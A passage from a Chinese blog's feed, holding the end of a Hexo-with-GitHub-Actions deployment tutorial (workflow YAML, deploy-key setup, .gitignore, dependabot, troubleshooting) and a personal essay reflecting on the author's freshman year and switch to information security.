class="string">&#125;&#125;</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">strategy:</span></span><br><span class="line">      <span class="attr">matrix:</span></span><br><span class="line">        <span class="attr">os:</span> [<span class="string">ubuntu-latest</span>]</span><br><span class="line">        <span class="attr">node_version:</span> [<span class="number">16.</span><span class="string">x</span>]</span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">theme</span> <span class="string">repo</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">repository:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_REPO</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_BRANCH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">themes/stellar</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">deploy</span> <span class="string">repo</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">repository:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.DEPLOY_REPO</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.DEPLOY_BRANCH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">.deploy_git</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node_version</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node_version</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Configuration</span> <span class="string">environment</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">HEXO_DEPLOY_PRI:</span> <span class="string">$&#123;&#123;secrets.HEXO_DEPLOY_PRI&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          sudo timedatectl set-timezone &quot;Asia/Shanghai&quot;</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$HEXO_DEPLOY_PRI&quot; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.name $GIT_USER</span></span><br><span class="line"><span class="string">          git config --global user.email $GIT_EMAIL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">hexo</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">          <span class="string">npm</span> <span class="string">run</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><p>现在对上述模板做出解释。<code>name</code>为workflow的名称，这是任意的。</p><h3 id="触发时机"><a class="markdownIt-Anchor" href="#触发时机"></a> 触发时机</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>以上为workflow触发的时机，即当<code>master</code>分支有新推送时触发。这里是否是<code>master</code>由你的源文件仓库分支名决定，若为<code>main</code>，则你需要修改成：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><h3 id="环境变量"><a class="markdownIt-Anchor" href="#环境变量"></a> 环境变量</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">GIT_USER:</span> <span class="string">felixchen0707</span></span><br><span class="line">  <span class="attr">GIT_EMAIL:</span> <span class="number">3137181992</span><span class="string">@qq.com</span></span><br><span class="line">  <span class="attr">THEME_REPO:</span> <span class="string">felixchen0707/hexo-theme-stellar</span></span><br><span class="line">  <span class="attr">THEME_BRANCH:</span> <span class="string">main</span></span><br><span class="line">  <span class="attr">DEPLOY_REPO:</span> <span class="string">felixchen0707/MyBlog</span></span><br><span class="line">  <span class="attr">DEPLOY_BRANCH:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><p>以上为workflow运行期间的变量，各个值需要你重新设置。<code>GIT_USER</code>为你的Github名称，<code>GIT_EMAIL</code>为你的邮箱，上述两者为触发workflow部署时的提交信息内容。</p><p><code>THEME_REPO</code>和<code>THEME_BRANCH</code>指定了你的博客主题，在workflow运行时会自动拉取主题代码。<strong>我强烈建议你fork一份主题仓库来避免主题仓库更新时配置文件落后的情况发生</strong>。</p><p><code>DEPLOY_REPO</code>和<code>DEPLOY_BRANCH</code>指定了向何处推送生成的静态文件。这里即为你一开始创建的存放静态文件的仓库。</p><h3 id="定制jobs"><a class="markdownIt-Anchor" href="#定制jobs"></a> 定制jobs</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Build</span> <span class="string">on</span> <span class="string">node</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node_version</span> <span class="string">&#125;&#125;</span> <span class="string">and</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.os</span> <span class="string">&#125;&#125;</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">strategy:</span></span><br><span class="line">      <span class="attr">matrix:</span></span><br><span class="line">        <span class="attr">os:</span> [<span class="string">ubuntu-latest</span>]</span><br><span class="line">        <span class="attr">node_version:</span> [<span class="number">16.</span><span class="string">x</span>]</span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">theme</span> <span class="string">repo</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">repository:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_REPO</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_BRANCH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">themes/stellar</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">deploy</span> <span class="string">repo</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">repository:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.DEPLOY_REPO</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.DEPLOY_BRANCH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">.deploy_git</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node_version</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node_version</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Configuration</span> <span class="string">environment</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">HEXO_DEPLOY_PRI:</span> <span class="string">$&#123;&#123;secrets.HEXO_DEPLOY_PRI&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          sudo timedatectl set-timezone &quot;Asia/Shanghai&quot;</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$HEXO_DEPLOY_PRI&quot; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.name $GIT_USER</span></span><br><span class="line"><span class="string">          git config --global user.email $GIT_EMAIL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">hexo</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">          <span class="string">npm</span> <span class="string">run</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><p>上述为workflow的具体流程，有几个部分值得你注意。</p><h4 id="nodejs版本"><a class="markdownIt-Anchor" href="#nodejs版本"></a> nodejs版本</h4><p>不同的主题对于nodejs有不同的版本要求，你需要在<code>node_version: [16.x]</code>设置，此处是nodejs最新的稳定版本，能够满足大多数主题要求，当然，你可以指定你需要的版本。</p><h4 id="拉取主题代码"><a class="markdownIt-Anchor" href="#拉取主题代码"></a> 拉取主题代码</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">theme</span> <span class="string">repo</span></span><br><span class="line">    <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">    <span class="attr">with:</span></span><br><span class="line">        <span class="attr">repository:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_REPO</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">ref:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_BRANCH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">themes/stellar</span></span><br></pre></td></tr></table></figure><p>上述步骤中，Github会拉取主题代码，仓库已由<code>THEME_REPO</code>和<code>THEME_BRANCH</code>决定。其中，你需要修改<code>path</code>的值，若为<code>themes/stellar</code>，则相当于将主题代码拉取至<code>/themes/stellar</code>下。需要注意的是，这里要和你的站点配置文件<code>_config.yml</code>中如下配置保持一致：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">stellar</span></span><br></pre></td></tr></table></figure><h2 id="添加gitignore"><a class="markdownIt-Anchor" href="#添加gitignore"></a> 添加.gitignore</h2><p>此时，你只需要在博客根目录下键入：</p><div class="tag-plugin copy"><input class="copy-area" id="copy_13" value="git init"><button class="copy-btn" onclick="util.copy(&quot;copy_13&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>将其初始化成为一个Git仓库。但提交时，有些文件是多余的，你可以将其写入<code>.gitignore</code>中，以下是一个例子：</p><figure class="highlight plaintext"><figcaption><span>.gitignore</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node_modules/</span><br><span class="line">themes/</span><br><span class="line">db.json</span><br></pre></td></tr></table></figure><p>然后提交并指定分支：</p><div class="tag-plugin copy"><input class="copy-area" id="copy_14" value="git commit"><button class="copy-btn" onclick="util.copy(&quot;copy_14&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><div class="tag-plugin copy"><input class="copy-area" id="copy_15" value="git branch -M main"><button class="copy-btn" onclick="util.copy(&quot;copy_15&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>然后绑定远程仓库：</p><div class="tag-plugin copy"><input class="copy-area" id="copy_16" value="git remote add origin git@github.com:felixchen0707/MyBlogSourceCode.git"><button class="copy-btn" onclick="util.copy(&quot;copy_16&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>最后推送即可：</p><div class="tag-plugin copy"><input class="copy-area" id="copy_17" value="git push"><button class="copy-btn" onclick="util.copy(&quot;copy_17&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><h1 id="常见问题"><a class="markdownIt-Anchor" href="#常见问题"></a> 常见问题</h1><h2 id="插件版本的更新"><a class="markdownIt-Anchor" href="#插件版本的更新"></a> 插件版本的更新</h2><p>虽然我们并没有提交<code>node_modules</code>文件夹，但我们推送了<code>package.json</code>和<code>package_lock.json</code>。两个文件详细记录了我们下载的插件及他们各自的依赖，在执行workflow时，action会自动collect这些包；如果我们对于这些依赖包有更新的需求，可以配置dependabot，在如下位置开启它：</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/11/11/tktDG.png" alt="dependabot启用位置" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">dependabot启用位置</span></div></div><p>此时，<code>.github</code>下会生成如下文件：</p><figure class="highlight yaml"><figcaption><span>.github/dependabot.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">updates:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">package-ecosystem:</span> <span class="string">npm</span></span><br><span class="line">  <span class="attr">directory:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="string">daily</span></span><br><span class="line">  <span class="attr">open-pull-requests-limit:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>插件的更新会通过pr的方式告知你，你只需要merge即可。</p><p>或者你可以在本地升级插件版本，重新推送。</p><div class="tag-plugin colorful note" color="blue"><div class="title">建议</div><div class="body"><p>建议推送前先使用<code>hexo s</code>预览，因为例如<code>hexo-abbrlink</code>这类插件会在预览或生成站点时在MarkDown文件的头部增加新的键值对。</p></div></div><h2 id="workflow运行提示action_bot无权限怎么办"><a class="markdownIt-Anchor" href="#workflow运行提示action_bot无权限怎么办"></a> workflow运行提示action_bot无权限怎么办</h2><p>请检查你是否安装了<code>hexo-deployer-git</code>插件，并且在配置文件中是否采取了ssh而非http连接：</p><figure class="highlight yaml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:felixchen0707/MyBlog.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><h2 id="我这么做还有什么好处"><a class="markdownIt-Anchor" href="#我这么做还有什么好处"></a> 我这么做还有什么好处？</h2><p>首先正如一开始所说的，你可以在部署时同时备份你的源文件。利用Action来部署站点，也使得你的本地环境并不依赖nodejs环境，例如你需要修改小错误时，完全也可以在手机上做到。当然，也并不是说利用Github Action部署就一定优越，大家可以按需食用。</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="博客" scheme="https://blog.snowflake.zone/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="博客" scheme="https://blog.snowflake.zone/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>我的大一</title>
    <link href="https://blog.snowflake.zone/posts/15/"/>
    <id>https://blog.snowflake.zone/posts/15/</id>
    <published>2022-10-31T16:00:00.000Z</published>
    <updated>2022-10-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>可能是想利用闲下来的功夫哔哔点啥。</p><span id="more"></span><div class="tag-plugin quot"><h2 class="content" id="前言" type="icon"><img class="icon prefix" src="https://bu.dusays.com/2022/10/24/63567d3e07da3.png" /><span class="text">前言</span><span class="empty"></span></h2></div><p>大一的生活比我想象的更快，加上一直不间断的疫情，大一后半段的生活似乎也就是在食堂和寝室两点一线中结束的。由于能看到这个博客的人要不就是在现实生活中与我毫无接触，要么就是无话不谈的好朋友，所以也不害怕暴露少部分的个人信息了。大一的各种琐事也都在最近渐渐收尾，不如自己来总结一下吧。</p><div class="tag-plugin quot"><h2 class="content" id="第一次早八" type="icon"><img class="icon prefix" src="https://bu.dusays.com/2022/10/24/63567d3e07da3.png" /><span class="text">第一次早八</span><span class="empty"></span></h2></div><p>看到2022级同学入学时令我佩服的精气神，我也不由得想起自己刚进入大学时的样子。许多细节我其实也记不太得，但是印象深刻的还是开学的第一堂高数课。那是我的第一个早八。早上大概七点二十分左右，整整五百人的大教室就快坐满人了，现在想想这个点我刚醒吧（笑）。其实当时我也是这些疯狂的人之中的一员。说起动机，也未必是对知识的渴求，<strong>而是对新生活环境的好奇</strong>。毕竟在高中，可能一屁股坐在凳子上以后都不怎么离开位置吧，跟大学课间跑课不能说一模一样，就是毫不相关。坐在教室里，看着周围新奇的环境和陌生的课本，有一瞬间觉得高中所付出的辛苦都是值得的。不得不说，一个还算可以的高考成绩确实把我送进了理想的学府，让我感受到了梦寐以求的环境和氛围。虽然第一节高数课确实把我心态搞炸了，但是当时的我，确实表现出了前所未有的积极向上。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/10/31/RitJs.png" alt="我的高数破防时刻" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">我的高数破防时刻</span></div></div><div class="tag-plugin quot"><h2 class="content" id="专业预选" type="icon"><img class="icon prefix" src="https://bu.dusays.com/2022/10/24/63567d3e07da3.png" /><span class="text">专业预选</span><span class="empty"></span></h2></div><p>出于某些懂的都懂的原因，我们学校对于工科专业是一起招收，入学后再进行二次分流。或许现在看来，这并不是什么稀奇事了，这种招生方式只会越来越广泛地被采取。但对于当时的我来说，简直就是噩梦。现在我依稀记得综评出分的那天晚上，我失眠了。我尽可能的从各种途径寻找能去<strong>信息安全</strong>的最低分数，甚至让原本不喜欢询问别人的我去加学长联系方式询问一些信息。其实我自己很清楚，这些努力基本上都是徒劳的，高考分数已然决定了我的去向，并不是我能够改变的。最后只能填了适合我这个分数段所能选择的我认为最有兴趣和前景的专业———生物医学工程。我记得很清楚，公布预选结果的时候我正在上大学化学这门课程，我整个暑假都在惦记的事情终于落地，似乎也没有那么焦虑和忧郁了。 <strong>仔细想想我很多时候都是这个样子，其实很清楚自己的未来会朝着什么样的地方发展，但却依旧忧心忡忡。我并不害怕差的结果，但我害怕未知。</strong> 不确定性是我一直很厌烦的事情。对于这个结果，后来我也很平静地接受了，虽然这本不是我最期望的结果。但站在现在的时间点，必须承认的是，我确实在生医工学院度过了值得我深深记住的大一学年。</p><div class="tag-plugin quot"><h2 class="content" id="大一下" type="icon"><img class="icon prefix" src="https://bu.dusays.com/2022/10/24/63567d3e07da3.png" /><span class="text">大一下</span><span class="empty"></span></h2></div><p>虽然接受了分流结果，但我依然努力寻找进信安的方式，大二上的专业调整是我唯一的机会。经过大一上一学期的学习，我的年排最终锁定在8/80.这是一个还算不错的成绩，但对于转信安来说，还是有点痴人说梦了。但是大一下，我们有转出平台的机会，换句话说，就是可以离开工科平台，去学其他的专业。因为疫情，金融专业放弃了面试考察，转而采取更为简单粗暴的按排名由高到低录取。这对我来说是个不小的诱惑。 <strong>当你无法选择自己喜欢的专业时，碰上宇宙金这个专业至少能保证不错的出路。</strong> 而对于我的排名，被成功录取的概率是很大的。当时我便在转出或等待大二上两个选择中纠结，毕竟后者有赌的成分。这也就是我<a href="/posts/b56d6855/">0624</a>这篇碎碎念的来源。如果将现在的我放在当时的情境下，即便过去五个多月，我依然不能给出准确的选择。但现在的我又很庆幸，当时的我没有因为眼前的另一条道路而选择退缩。 <strong>在我看来，尝试后的失败比自我放弃的失败更加值得尊敬。</strong></p><div class="tag-plugin quot"><h2 class="content" id="我在生医工学联" type="icon"><img class="icon prefix" src="https://bu.dusays.com/2022/10/24/63567d3e07da3.png" /><span class="text">我在生医工学联</span><span class="empty"></span></h2></div><p>整个大一的我基本都是围绕学积分在转，因此对于大学生活的多样和丰富我几乎没有什么感觉，反而是时常陷入焦虑的旋涡中。但唯一有一个选择是我从未后悔的，就是加入生医工的院学联。在这里，我真真切切感受到了社交间的温暖。许多人都曾在我面前抱怨过学生组织内部的腐烂，但对我而言，生医工学联带给我的是如同第二个家一般的温暖。由于院系小的缘故，学院每月都有固定的生日会，为当月生日的同学准备蛋糕；学联的同学们也经常性冒出很有想法的活动点子，使得我们学院看上去像是天天在搞活动；各部门内部的例会硬生生会被我们组织成团建的样子。诸如此类，还有很多。在这里，我确实认识了一帮很有意思的人们，以及很优秀的值得尊重的其他同学。<strong>我想如果有什么是让我依旧怀念的，生医工团学联可能占据了很大一部分。</strong></p><div class="tag-plugin quot"><h2 class="content" id="大一结束" type="icon"><img class="icon prefix" src="https://bu.dusays.com/2022/10/24/63567d3e07da3.png" /><span class="text">大一结束</span><span class="empty"></span></h2></div><p>如今，虽然已经到了大二第一学期期中了，但我大一所担心的一切事物，都才刚刚结束。我达到了我一年前想都不敢想的高度，也为我日日胆战心惊所焦虑的事情交出了还算不错的答卷。我转去了我当初心心念念的信息安全，选拔上了金融的辅修，也在生医工的学联完成了我完完全全策划一场活动的梦想。我开始真正接触信息技术，我认识了一大批值得尊敬的同学，我遇上了不少我可能这辈子都不会忘记的教授。走上一个新的阶段，就意味着过去的一切已经被慢慢封存，而未来的路还等着我慢慢开辟。我可能会陷入新的痛苦，也有可能收获新的喜悦；我可能会受到挫折的历练，也可能体会到苦尽甘来的惊喜。不论如何，<strong>很多事都要我自己去闯。</strong></p><p><strong>未来的好坏我无法预知，但未来一直在我的手中。</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;可能是想利用闲下来的功夫哔哔点啥。&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://blog.snowflake.zone/categories/%E6%9D%82%E8%B0%88/"/>
    
    
